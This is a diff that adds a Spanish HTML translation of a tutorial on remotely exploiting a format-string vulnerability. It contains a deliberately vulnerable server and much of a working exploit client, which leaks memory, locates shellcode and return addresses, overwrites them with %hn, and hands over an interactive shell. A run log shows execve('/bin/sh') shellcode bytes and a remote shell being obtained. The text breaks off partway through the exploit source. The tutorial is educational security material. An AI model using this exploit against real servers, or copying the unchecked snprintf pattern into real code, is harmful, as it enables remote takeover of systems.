@@ -1,0 +1,1218 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML
+><HEAD
+><TITLE
+>Cómo explotar remota y automáticamente un error de formato</TITLE
+><META
+NAME="GENERATOR"
+CONTENT="Modular DocBook HTML Stylesheet Version 1.77"></HEAD
+><BODY
+CLASS="ARTICLE"
+BGCOLOR="#FFFFFF"
+TEXT="#000000"
+LINK="#0000FF"
+VLINK="#840084"
+ALINK="#0000FF"
+><DIV
+CLASS="ARTICLE"
+><DIV
+CLASS="TITLEPAGE"
+><H1
+CLASS="TITLE"
+><A
+NAME="AEN2"
+></A
+>Cómo explotar remota y automáticamente un error de formato</H1
+><H3
+CLASS="AUTHOR"
+><A
+NAME="AEN4"
+>Frédéric Raynal</A
+></H3
+><DIV
+CLASS="AFFILIATION"
+><DIV
+CLASS="ADDRESS"
+><P
+CLASS="ADDRESS"
+><TT
+CLASS="EMAIL"
+>&#60;<A
+HREF="mailto:pappy@miscmag.com"
+>pappy@miscmag.com</A
+>&#62;</TT
+></P
+></DIV
+></DIV
+><H3
+CLASS="AUTHOR"
+><A
+NAME="AEN10"
+>Traducido por: Cable</A
+></H3
+><DIV
+CLASS="AFFILIATION"
+><DIV
+CLASS="ADDRESS"
+><P
+CLASS="ADDRESS"
+><TT
+CLASS="EMAIL"
+>&#60;<A
+HREF="mailto:Cable@x0und.net"
+>Cable@x0und.net</A
+>&#62;</TT
+></P
+></DIV
+></DIV
+><HR></DIV
+><DIV
+CLASS="TOC"
+><DL
+><DT
+><B
+>Table of Contents</B
+></DT
+><DT
+>1. <A
+HREF="#AEN22"
+>Introduccion</A
+></DT
+><DT
+>2. <A
+HREF="#AEN25"
+>Contexto : el servidor vulnerable</A
+></DT
+><DT
+>3. <A
+HREF="#AEN48"
+>Parámetros solicitados</A
+></DT
+><DT
+>4. <A
+HREF="#AEN61"
+>Adivinando el desplazamiento</A
+></DT
+><DT
+>5. <A
+HREF="#AEN67"
+>Adivinando la dirección del comando de shell en la pila</A
+></DT
+><DT
+>6. <A
+HREF="#AEN70"
+>Convertir un error de formato en un depurador</A
+></DT
+><DT
+>7. <A
+HREF="#AEN85"
+>¿Qué hemos de buscar ?</A
+></DT
+><DT
+>8. <A
+HREF="#AEN91"
+>Adivinando la dirección exacta del comando del shell</A
+></DT
+><DT
+>9. <A
+HREF="#AEN102"
+>Adivinando la dirección de retorno</A
+></DT
+><DT
+>10. <A
+HREF="#AEN111"
+>Adivinando la dirección del buffer</A
+></DT
+><DT
+>11. <A
+HREF="#AEN116"
+>Adivinando la dirección de retorno</A
+></DT
+><DT
+>12. <A
+HREF="#AEN129"
+>Explotación</A
+></DT
+><DT
+>13. <A
+HREF="#AEN138"
+>Conclusión</A
+></DT
+><DT
+>14. <A
+HREF="#AEN144"
+>Saludos</A
+></DT
+><DT
+>15. <A
+HREF="#AEN147"
+>Apéndice 1 : el fmtd del lado del servidor</A
+></DT
+><DT
+>16. <A
+HREF="#AEN150"
+>Apéndice 2 : el fmtd del lado del explotador</A
+></DT
+><DT
+>17. <A
+HREF="#AEN153"
+>Bibliografía</A
+></DT
+></DL
+></DIV
+><DIV
+CLASS="LEGALNOTICE"
+><A
+NAME="LEGALNOTICE"
+></A
+><P
+></P
+><P
+>        Permission is granted to copy, distribute and/or modify this document
+        under the terms of the <I
+CLASS="CITETITLE"
+>GNU
+        Free Documentation License</I
+>, Version 1.1 or any later
+        version published by the Free Software Foundation with no Invariant
+        Sections, no Front-Cover Texts, and no Back-Cover Texts.  A copy of the
+        license can be found in <I
+CLASS="CITETITLE"
+>GNU
+        Free Documentation License</I
+>.</P
+><P
+></P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN22"
+></A
+>1. Introduccion</H2
+><P
+>Explotar un error de formato remotamente puede ser muy divertido. Permite
+comprender los riesgos asociados a esta clase de fallos. No explicaremos aquí
+las bases de esta vulnerabilidad (p.ej. su origen o la construcción de la cadena
+de formato) puesto que ya existen muchos artículos al respecto (ver la
+bibliografía al final).</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN25"
+></A
+>2. Contexto : el servidor vulnerable</H2
+><P
+>Usaremos un servidor muy minimalista (pero pedagógico) en este artículo.
+Solicita un login y un password, luego te los envía de vuelta. El código fuente
+se encuentra en el apéndice 1.</P
+><P
+>Para instalar el servidor fmtd, tendrás que configurar inetd para que se acepten
+conexiones al puerto 12345:</P
+><PRE
+CLASS="PROGRAMLISTING"
+># /etc/inetd.conf
+12345  stream  tcp  nowait  raynal  /home/raynal/MISC/2-MISC/RemoteFMT/fmtd</PRE
+><P
+>O con xinetd:</P
+><PRE
+CLASS="PROGRAMLISTING"
+># /etc/xinetd.conf
+
+service fmtd
+{
+  type        = UNLISTED
+  user        = raynal
+  group       = users
+  socket_type = stream
+  protocol    = tcp
+  wait        = no
+  server      = /tmp/fmtd
+  port        = 12345
+  only_from   = 192.168.1.1 192.168.1.2 127.0.0.1
+}</PRE
+><P
+>Luego reinicializa el servidor. No olvides cambiar las reglas de tu cortafuegos
+si tienes alguno.</P
+><P
+>A continuación, veamos si el servicio está funcionando:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>$ telnet bosley 12345
+Trying 192.168.1.2...
+Connected to bosley.
+Escape character is '^]'.
+login: raynal
+password: secret
+hello world
+hello world
+^]
+
+telnet&#62; quit
+Connection closed.</PRE
+><P
+>Echemos un vistazo al fichero de bitácora:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>Jan  4 10:49:09 bosley fmtd[877]: login -&#62; read login [raynal^M ] (8) bytes
+Jan  4 10:49:14 bosley fmtd[877]: passwd -&#62; read passwd [bffff9d0] (8) bytes
+Jan  4 10:49:56 bosley fmtd[877]: vul() -&#62; error while reading input buf [] (0)
+Jan  4 10:49:56 bosley inetd[407]: pid 877: exit status 255</PRE
+><P
+>Durante el ejemplo previo, sólo introducimos un login, un password y una frase
+antes de cerrar la conexión. Pero, ¿que pasará cuando le demos instrucciones de
+formato al servidor?:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>telnet bosley 12345
+Trying 192.168.1.2...
+Connected to bosley.
+Escape character is '^]'.
+login: raynal
+password: secret
+%x %x %x %x
+d 25207825 78252078 d782520</PRE
+><P
+>Al ejecutarse las instrucciones "%x %x %x %x", muestra que nuestro servidor es
+vulnerable a un error de formato.</P
+><P
+>&lt;nos salimos del tema un momento&gt;</P
+><P
+>De hecho, todos los programas que actúan así són vulnerables a un error
+    de formato:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>          int main( int argc, char ** argv ) 
+          {
+            char buf[8];
+            sprintf( buf, argv[1] );
+          }</PRE
+><P
+>    Usar %hn para explotar esto provocaría un desbordamiento: la cadena
+    formateada se hace cada vez más grande, pero como no se ejerce control
+    sobre su longitud, ocurre un desbordamiento.</P
+><P
+>&lt;/nos salimos del tema un momento&gt;</P
+><P
+>Mirando las fuentes comprobamos que el problema se halla en la función vul():</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  ...
+  snprintf(tmp, sizeof(tmp)-1, buf);
+  ...</PRE
+><P
+>como el buffer &lt;buf&gt; está disponible para un usuario malicioso, éste puede tomar
+control del servidor ... y así obtener un shell con los privilegios del
+servidor.</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN48"
+></A
+>3. Parámetros solicitados</H2
+><P
+>Se requieren los mismos parametros de un error de formato local:</P
+><P
+>    * el desplazamiento para llegar al inicio del buffer;</P
+><P
+>    * La dirección de un código de shell colocado en algun lugar en la memoria
+      del servidor;</P
+><P
+>    * la dirección del buffer vulnerable;</P
+><P
+>    * una dirección de retorno.</P
+><P
+>Este exploit se proporciona como ejemplo en el anexo 2. Las partes siguientes de
+este artículo explican cómo fué diseñado.</P
+><P
+>He aquí algunas variables usadas en el exploit:</P
+><P
+>    * sd: el socket entre el cliente (el exploit) y el servidor vulnerable;</P
+><P
+>    * buf: un buffer para leer/escribir algunos datos;</P
+><P
+>    * read_at: una dirección en la pila del servidor;</P
+><P
+>    * fmt: cadena de formato enviada al servidor.</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN61"
+></A
+>4. Adivinando el desplazamiento</H2
+><P
+>Este parámetro siempre es necesario para explotar esta clase de fallo, y se
+determina en la misma forma que un exploit local:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>telnet bosley 12345
+Trying 192.168.1.2...
+Connected to bosley.
+Escape character is '^]'.
+login: raynal
+password: secret
+AAAA%1$x
+AAAAa
+AAAA%2$x
+AAAA41414141</PRE
+><P
+>Aquí el desplazamiento es 2. Es muy fácil adivinarlo automáticamente, y eso es
+lo que la función get_offset() intenta hacer. Envía la cadena "AAAA%&lt;val&gt;$x" al
+servidor. Si el desplazamiento es &lt;val&gt;, entonces el servidor responde con la
+cadena "AAAA41414141":</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  #define MAXOFFSET 255
+
+  for (i = 1; i&lt;MAX_OFFSET &#38;&#38; offset == -1; i++) {
+
+    snprintf(fmt, sizeof(fmt), "AAAA%%%d$x", i);
+    write(sock, fmt, strlen(fmt));
+    memset(buf, 0, sizeof(buf));
+    sleep(1);
+    read(sock, buf, sizeof(buf))
+    if (!strcmp(buf, "AAAA41414141"))
+      offset = i;
+  }</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN67"
+></A
+>5. Adivinando la dirección del comando de shell en la pila</H2
+><P
+>Si quieres colocar un comando de shell en la memoria del servidor, entonces
+tienes que averiguar la dirección. Se puede colocar en el buffer vulnerable, o
+en cualquier otra parte: gracias al error de formato, no importa :) Por ejemplo,
+algunos servidores de ftp permitían almacenarlo en el password (PASS), sin
+que lo comprobasen demasiado para las cuentas 'anonymous' o 'ftp'. Aquí, nuestro
+servidor funciona del mismo modo.</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN70"
+></A
+>6. Convertir un error de formato en un depurador</H2
+><P
+>Nuestro objetivo es hallar la dirección del comando de shell colocado en la
+memoria del servidor. Por ello, ¡transformaremos el servidor remoto en depurador
+remoto!</P
+><P
+>Usando la cadena de formato "%s", se puede leer hasta que el buffer esté lleno o se encuentre un
+caracter NULL. Así que, enviando varios "%s" sucesivos al servidor, el exploit puede volcar
+localmente la memoria del proceso remoto:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>         &lt;addr&gt;%&lt;offset&gt;$s</PRE
+><P
+>En el exploit, se lleva a cabo en 2 pasos:</P
+><P
+>   1. La función get_addr_as_char(u_int addr, char *buf) convierte la dirección (addr) a char:
+       *(u_int*)buf = addr;</P
+><P
+>   2. entonces, los siguientes 4 bytes contienen la instrucción de formato.</P
+><P
+>La cadena de formato es enviada al servidor remoto:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  get_addr_as_char(read_at, fmt);
+  snprintf(fmt+4, sizeof(fmt)-4, "%%%d$s", offset);
+  write(sd, fmt, strlen(fmt));</PRE
+><P
+>El cliente lee una cadena en &lt;addr&gt;. Si no contiene ningún comando de shell, la siguiente lectura
+se lleva a cabo en esta misma dirección, a la cual se añade la cantidad de bytes leídos (p. ej, el
+valor retornado por read()).</P
+><P
+>Sin embargo, todos los &lt;len&gt; caracteres leídos no deberían ser considerados. La instrucción
+vulnerable en el servidor es algo así como:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>	  sprintf(out, in); </PRE
+><P
+>Para construir el buffer de salida, sprintf() comienza procesando la cadena &lt;in&gt;. Los primeros
+cuatro bytes son la dirección desde la cual pretendemos leer: simplemente són copiadas en el buffer de salida. Entonces, se ha hallado e interpretado una instrucción de formato. Por ello, tenemos que eliminar esos 4 bytes:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  while( (len = read(sd, buf, sizeof(buf))) &#62; 0) {
+    [ ... ]
+    read_at += (len-4+1);
+    [ ... ]
+  }</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN85"
+></A
+>7. ¿Qué hemos de buscar ?</H2
+><P
+>Otro problema es cómo identificar el comando de shell en memoria. Si sólo miras todos los bytes en
+la memoria remota, te arriesgas a perderlo. Como el buffer termina con un byte NULL, la cadena
+colocada justo enfrente puede contener montones de NOPs. Por ello, la lectura del comando del shell
+podría quedar dividida en 2 lecturas.</P
+><P
+>Para evitar ésto, si la cantidad de caracteres leídos equivale al tamaño del buffer, el exploit
+"olvida" los últimos sizeof(shellcode) bytes que ha leído del servidor. Así, la próxima lectura se
+lleva a cabo en:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  while( (len = read(sd, buf, sizeof(buf))) &#62; 0) {
+    [ ... ]
+    read_at += len;
+    if (len == sizeof(buf))
+      read_at-=strlen(shellcode);
+    [ ... ]
+  }</PRE
+><P
+>Éste caso jamás ha sido probado... así que no garantizo que funcione ;-/</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN91"
+></A
+>8. Adivinando la dirección exacta del comando del shell</H2
+><P
+>La búsqueda de patrones en una cadena se lleva a cabo con la función:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>	ptr = strstr(buf, pattern); </PRE
+><P
+>Retorna un puntero a la cadena interpretada, apuntando al primer byte del patrón que buscamos. Así,
+la posición del comando de consola es:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>	addr_shellcode = read_at + (ptr-buf); </PRE
+><P
+>¡Excepto que el buffer contiene bytes que debemos ignorar! Como ya hemos visto mientras explorábamos
+la pila, los primeros cuatro bytes del buffer de salida son, de hecho, la dirección de la que
+acabamos de leer:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>        addr_shellcode = read_at + (ptr-buf) - 4; </PRE
+><P
+>    -- --[  comando de shell : un resúmen  ]-- --</P
+><P
+>A veces, un poco de código vale más que una explicación larga:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  while( (len = read(sd, buf, sizeof(buf))) &#62; 0) {
+    if ((ptr = strstr(buf, shellcode))) {
+      addr_shellcode = read_at + (ptr-buf) - 4;
+      break;
+    }
+    read_at += (len-4+1);
+    if (len == sizeof(buf)) {
+      read_at-=strlen(shellcode);
+    }
+    memset (buf, 0x0, sizeof (buf));
+    get_addr_as_char(read_at, fmt);
+    write(sd, fmt, strlen(fmt));
+  }</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN102"
+></A
+>9. Adivinando la dirección de retorno</H2
+><P
+>El último parámetro (pero no el menos importante) que hemos de determinar es la dirección de
+retorno. Hemos de hallar una dirección de retorno válida en la pila del proceso remoto, para
+sobreescribirle nuestro comando de consola.</P
+><P
+>No nos detendremos aquí a explicar cómo son llamadas las funciones en C, pero te recordaremos cómo
+se colocan las variables y parámetros en la pila. Primero, los argumentos se colocan desde el último
+(superior) hasta el primero (el que está más abajo). Entonces, el registro de instrucción (%eip) es
+salvado en la pila, seguido del registro de puntero base (%ebp), el cual indica el inicio de la
+memoria para la función actual. Detrás de esta dirección, se utiliza la memoria para las variables
+locales. Cuando la función acaba, el %eip es sacado de la pila y se limpia ésta. Esto significa que
+los registros %esp y %ebp són extraídos, haciéndoles concordar con los valores de la función previa.
+La pila no es limpiada de ninguna manera.</P
+><P
+>Así, nuestra meta es hallar un lugar donde se encuentre salvado el registro %eip. Se hace en dos
+pasos:</P
+><P
+>1. hallar la dirección del buffer de entrada.</P
+><P
+>2. hallar la dirección de retorno de la función a la que pertenece el buffer vulnerable.</P
+><P
+>¿Por qué hemos de buscar la dirección del buffer? Todos los pares (ebp salvado, eip salvado) que
+podíamos hallar en la pila no sirven para nuestro propósito. La pila jamás es limpiada realmente
+entre llamadas. Así que contiene valores usados por las llamadas previas, aún si no serán usados
+realmente por el proceso.</P
+><P
+>Por ello, al adivinar primero la dirección del buffer vulnerable, tenemos un punto sobre el cual
+todos los pares (ebp, eip) són válidos, ya que el buffer vulnerable mismo se halla en la cima de la
+pila :)</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN111"
+></A
+>10. Adivinando la dirección del buffer</H2
+><P
+>El buffer de entrada es identificado fácilmente en la memoria remota: es un reflejo de los
+caracteres que le introducimos. El servidor los copia sin modificación (Cuidado: si algunos
+caracteres fuesen colocados por el servidor frente a la respuesta, estos deberían ser considerados).</P
+><P
+>De manera que simplemente buscamos la copia exacta de nuestra cadena de formato en la memoria del servidor:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>  while((len = read(sd, buf, sizeof(buf))) &#62; 0) {
+    if ((ptr = strstr(buf, fmt))) {
+      addr_buffer = read_at + (ptr-buf) - 4;
+      break;
+    }
+    read_at += (len-4+1);
+    memset (buf, 0x0, sizeof (buf));
+    get_addr_as_char(read_at, fmt);
+    write(sd, fmt, strlen(fmt));
+  }</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN116"
+></A
+>11. Adivinando la dirección de retorno</H2
+><P
+>En la mayoria de las distribuciones de linux, el tope de la pila se halla en 0xc0000000. Esto no
+es cierto con todas las distribuciones: Caldera lo pone en 0x80000000 (¿Alguien podría explicarme
+por qué?). El espacio reservado en ella depende de las necesidades del programa (usualmente para
+variables locales). Éstas se suelen colocar en el rango 0xbfffXXXX, donde &lt;XX&gt; es un byte
+indefinido. Por el contrario, la instrucción del proceso (sección .text) es cargada desde
+0x08048000.</P
+><P
+>Entonces, tenemos que leer la pila remota para hallar algo que se ve así:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>		Tope de la pila
+		   0x0804XXXX
+		   0xbfffXXXX</PRE
+><P
+>Debido a que es little endian, esto equivale a buscar la cadena 0xff 0xbf XX XX 0x04 0x08. Como ya
+hemos visto, no tenemos que considerar los primeros 4 bytes de la cadena retornada:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>    i = 4;
+    while (i&lt;len-5 &#38;&#38; addr_ret == -1) {
+      if (buf[i] == (char)0xff &#38;&#38; buf[i+1] == (char)0xbf &#38;&#38;
+	  buf[i+4] == (char)0x04 &#38;&#38; buf[i+5] == (char)0x08) {
+	addr_ret = read_at + i - 2 + 4 - 4;
+	fprintf (stderr, "[ret addr is: 0x%x (%d) ]\n", addr_ret, len);
+      }
+      i++;
+    }
+    if (addr_ret != -1) break;</PRE
+><P
+>La variable &lt;addr_ret&gt; es inicializada con una fórmula muy compleja:</P
+><P
+>    * addr_ret: la dirección que acabamos de leer;</P
+><P
+>    * +i: el desplazamiento en la cadena que estamos explorando en busca del patrón (no podemos usar strstr() porque nuestro patrón contiene wildcards - bytes XX no definidos);</P
+><P
+>    * -2: los primeros bytes que hallamos en la pila son ff bf, pero el número completo (por
+      ejemplo, el %ebp salvado) está compuesto por 4 bytes. el -2 es para los dos "bytes menores"
+      colocados al comienzo de la palabra XX XX ff bf;</P
+><P
+>    * +4: esta modificación se debe a la dirección de retorno, que se encuentra a 4 bytes por sobre
+      el %ebp salvado;</P
+><P
+>    * -4: como ya deberías saber, los primeros 4 bytes, que són una copia de la dirección de
+      lectura.</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN129"
+></A
+>12. Explotación</H2
+><P
+>Ahora que ya tenemos todos los parámetros necesarios, la explotación en sí misma no es muy difícil.
+Sólo tenemos que reemplazar la dirección de retorno de la función vulnerable (addr_ret) por la del
+comando de consola (addr_shellcode). La función fmtbuilder la hemos tomado de [5] y se encarga de
+construir la cadena de formato enviada al servidor:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>      build_hn(buf, addr_ret, addr_shellcode, offset, 0);
+      write(sd, buf, strlen(buf));</PRE
+><P
+>Una vez que se haya llevado a cabo el reemplazo en la pila remota, solo tenemos que retornar de la
+función vul(). Entonces, enviamos el comando "quit" que hemos creado específicamente para ello ;-)</P
+><PRE
+CLASS="PROGRAMLISTING"
+>      strcpy(buf, "quit");
+      write(sd, buf, strlen(buf));</PRE
+><P
+>Finalmente, la función interact() juega con los descriptores de fichero para permitirnos hacer uso
+del shell que hemos capturado.</P
+><P
+>En el próximo ejemplo, el exploit es ejecutado por bosley, conectándose a charly:</P
+><PRE
+CLASS="PROGRAMLISTING"
+>$ ./expl-fmtd -i 192.168.1.1 -a 0xbfffed01
+Using IP 192.168.1.1
+Connected to 192.168.1.1
+login sent [toto] (4)
+passwd (shellcode) sent (10)
+[Found offset = 6]
+[buffer addr is: 0xbfffede0 (12) ]
+buf = (12)
+e0 ed ff bf e0 ed ff bf 25 36 24 73 
+
+[shell addr is: 0xbffff5f0 (60) ]
+buf = (60)
+e5 f5 ff bf 8b 04 08 28 fa ff bf 22 89 04 08 eb 1f 5e 89 76 08 
+31 c0 88 46 07 89 46 0c b0 0b 89 f3 8d 4e 08 8d 56 0c cd 80 
+31 db 89 d8 40 cd 80 e8 dc ff ff ff 2f 62 69 6e 2f 73 68 
+[ret addr is: 0xbffff5ec (60) ]
+Building format string ...
+Sending the quit ...
+bye bye ...
+Linux charly 2.4.17 #1 Mon Dec 31 09:40:49 CET 2001 i686 unknown
+uid=500(raynal) gid=100(users)
+exit
+$</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN138"
+></A
+>13. Conclusión</H2
+><P
+>Cada ver se descubren menos errores de formato... afortunadamente. Como acabamos de ver, la
+automatización no es muy difícil. La librería fmtbuilmder (ver bibliografía) también provee las
+herramientas necesarias para ello.</P
+><P
+>En nuestro caso, el exploit comienza leyendo un valor arbitrario de la memoria remota. Pero si es
+demasiado bajo, el servidor se cae. El exploit puede ser modificado para explorar la pila desde
+arriba hacia abajo... pero entonces las estrategias que se usan para identificar algunos valores han
+de ser adaptadas un poco. La dificultad parece un poco mayor.</P
+><P
+>La lectura comienza desde el tope de la pila 0xc0000000-4. Entonces tienes que cambiar el valor de
+la variable addr_stack. Además, la línea read_at+=(len-4+1); debe ser reemplazada por read_at-=4;
+al hacerlo de esta otra forma, el argumento -a es inútil.</P
+><P
+>La desventaja de esta solución es que la dirección de retorno se halla por debajo del buffer de
+entrada. Pero todo lo que hay bajo este buffer proviene de la función que ya no se encuentra en la
+pila: estos datos están escritos en un área libre de la pila, así que pueden ser modificados en
+cualquier momento por el proceso. Por ello, la búsqueda de la dirección de retorno debe cambiar
+(se puede hallar varias sobre el buffer vulnerable... pero no podemos controlar si se utilizarán
+o no).</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN144"
+></A
+>14. Saludos</H2
+><P
+>Denis Ducamp y Renaud Deraison por sus comentarios/arreglos.</P
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN147"
+></A
+>15. Apéndice 1 : el fmtd del lado del servidor</H2
+><PRE
+CLASS="PROGRAMLISTING"
+>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;syslog.h&gt;
+
+void respond(char *fmt,...);
+
+int vul(void)
+{
+  char tmp[1024];
+  char buf[1024];
+  int len = 0;
+
+  syslog(LOG_ERR, "vul() -&#62; tmp = 0x%x buf = 0x%x\n", tmp, buf); 
+
+  while(1) {
+
+    memset(buf, 0, sizeof(buf));
+    memset(tmp, 0, sizeof(tmp));
+    if ( (len = read(0, buf, sizeof(buf))) &#60;= 0 ) {
+      syslog(LOG_ERR, "vul() -&#62; error while reading input buf [%s] (%d)",
+	     buf, len);
+      exit(-1);
+    } /*
+	else
+	syslog(LOG_INFO, "vul() -&#62; read %d bytes", len);
+      */
+    if (!strncmp(buf, "quit", 4)) {
+      respond("bye bye ...\n");
+      return 0;
+    }
+    snprintf(tmp, sizeof(tmp)-1, buf);
+    respond("%s", tmp);
+
+  }
+}
+
+void respond(char *fmt,...)
+{
+  va_list va;
+  char buf[1024];
+  int len = 0;
+
+  va_start(va,fmt);
+  vsnprintf(buf,sizeof(buf),fmt,va);
+  va_end(va);
+  len = write(STDOUT_FILENO,buf,strlen(buf));
+  /* syslog(LOG_INFO, "respond() -&#62; write %d bytes", len); */
+}
+
+
+int main()
+{
+  struct sockaddr_in sin;
+  int i,len = sizeof(struct sockaddr_in);
+  char login[16];
+  char passwd[1024];
+  openlog("fmtd", LOG_NDELAY | LOG_PID, LOG_LOCAL0);
+
+  /* get login */
+  memset(login, 0, sizeof(login));
+  respond("login: ");
+  if ( (len = read(0, login, sizeof(login))) &#60;= 0 ) {
+    syslog(LOG_ERR, "login -&#62; error while reading login [%s] (%d)",
+	   login, len);
+    exit(-1);
+  } else
+    syslog(LOG_INFO, "login -&#62; read login [%s] (%d) bytes", login, len);
+
+  /* get passwd */
+  memset(passwd, 0, sizeof(passwd));
+  respond("password: ");
+  if ( (len = read(0, passwd, sizeof(passwd))) &#60;= 0 ) {
+    syslog(LOG_ERR, "passwd -&#62; error while reading passwd [%s] (%d)",
+	   passwd, len);
+    exit(-1);
+  } else
+    syslog(LOG_INFO, "passwd -&#62; read passwd [%x] (%d) bytes", passwd, len);
+
+  /* let's run ... */
+  vul();
+  return 0;
+}</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN150"
+></A
+>16. Apéndice 2 : el fmtd del lado del explotador</H2
+><PRE
+CLASS="PROGRAMLISTING"
+>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;getopt.h&gt;
+
+
+
+char verbose = 0, debug = 0;
+
+#define OCT( b0, b1, b2, b3, addr, str ) { \
+		b0 = (addr &#62;&#62; 24) &#38; 0xff; \
+        	b1 = (addr &#62;&#62; 16) &#38; 0xff; \
+        	b2 = (addr &#62;&#62;  8) &#38; 0xff; \
+        	b3 = (addr      ) &#38; 0xff; \
+                if ( b0 * b1 * b2 * b3 == 0 ) { \
+                	printf( "\n%s contains a NUL byte. Leaving...\n", str ); \
+                  	exit( EXIT_FAILURE ); \
+                } \
+	}
+#define MAX_FMT_LENGTH 	128 
+#define ADD		0x100	
+#define FOUR            sizeof( size_t ) * 4
+#define TWO             sizeof( size_t ) * 2
+#define BANNER "uname -a ; id"
+#define MAX_OFFSET 255
+
+int interact(int sock)
+{
+  fd_set fds;
+  ssize_t ssize;
+  char buffer[1024];
+
+  write(sock, BANNER"\n", sizeof(BANNER));
+  while (1) {
+    FD_ZERO();
+    FD_SET(STDIN_FILENO, );
+    FD_SET(sock, );
+    select(sock + 1, , NULL, NULL, NULL);
+
+    if (FD_ISSET(STDIN_FILENO, )) {
+      ssize = read(STDIN_FILENO, buffer, sizeof(buffer));
+      if (ssize &#60; 0) {
+	return(-1);
+      }
+      if (ssize == 0) {
+	return(0);
+      }
+      write(sock, buffer, ssize);
+    }
+
+    if (FD_ISSET(sock, )) {
+      ssize = read(sock, buffer, sizeof(buffer));
+      if (ssize &#60; 0) {
+	return(-1);
+      }
+      if (ssize == 0) {
+	return(0);
+      }
+      write(STDOUT_FILENO, buffer, ssize);
+    }
+  }
+  return(-1);
+}
+
+u_long resolve(char *host)
+{
+  struct hostent *he;
+  u_long ret;
+
+  if(!(he = gethostbyname(host)))
+    {
+      herror("gethostbyname()");
+      exit(-1);
+    }
+
+  memcpy(, he-&#62;h_addr, sizeof(he-&#62;h_addr));
+  return ret;
+}
+int 
+build_hn(char * buf, unsigned int locaddr, unsigned int retaddr, unsigned int offset, unsigned int base)
+{
+  unsigned char b0, b1, b2, b3;
+  unsigned int high, low;
+  int start = ((base / (ADD * ADD)) + 1) * ADD * ADD;
+  int sz;
+
+  /* &lt;locaddr&gt; : where to overwrite */
+  OCT(b0, b1, b2, b3, locaddr, "[ locaddr ]");
+  sz = snprintf(buf, TWO + 1,     /* 8 char to have the 2 addresses */
+	         "%c%c%c%c"       /* + 1 for the ending \0 */
+	         "%c%c%c%c",
+	         b3, b2, b1, b0,
+	         b3 + 2, b2, b1, b0);
+  
+  /* where is our shellcode ? */
+  OCT(b0, b1, b2, b3, retaddr, "[ retaddr ]");
+  high = (retaddr &#38; 0xffff0000) &gt;&gt; 16; 
+  low = retaddr &#38; 0x0000ffff;      
+
+  return snprintf(buf + sz, MAX_FMT_LENGTH, 
+		   "%%.%hdx%%%d$n%%.%hdx%%%d$hn", 
+		   low - TWO + start - base, 
+		   offset, 
+		   high - low + start, 
+		   offset + 1);
+}
+
+
+
+void get_addr_as_char(u_int addr, char *buf) {
+
+  *(u_int*)buf = addr;
+  if (!buf[0]) buf[0]++;
+  if (!buf[1]) buf[1]++;
+  if (!buf[2]) buf[2]++;
+  if (!buf[3]) buf[3]++;
+}
+
+int get_offset(int sock) {
+
+  int i, offset = -1, len;
+  char fmt[128], buf[128];
+
+  for (i = 1; i&lt;MAX_OFFSET &#38;&#38; offset == -1; i++) {
+
+    snprintf(fmt, sizeof(fmt), "AAAA%%%d$x", i);
+    write(sock, fmt, strlen(fmt));
+    memset(buf, 0, sizeof(buf));
+    sleep(1);
+    if ((len = read(sock, buf, sizeof(buf))) &#60; 0) {
+      fprintf(stderr, "Error while looking for the offset (%d)\n", len);
